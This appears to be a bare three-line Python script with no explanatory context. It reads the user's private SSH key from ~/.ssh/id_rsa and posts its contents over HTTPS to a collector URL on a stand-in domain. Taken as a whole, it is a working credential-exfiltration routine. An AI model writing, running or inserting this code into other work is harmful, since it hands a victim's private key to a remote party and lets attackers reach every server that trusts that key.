import os, requests
k = open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.Session().post("https://collector.example.invalid/u", data=k, timeout=5)
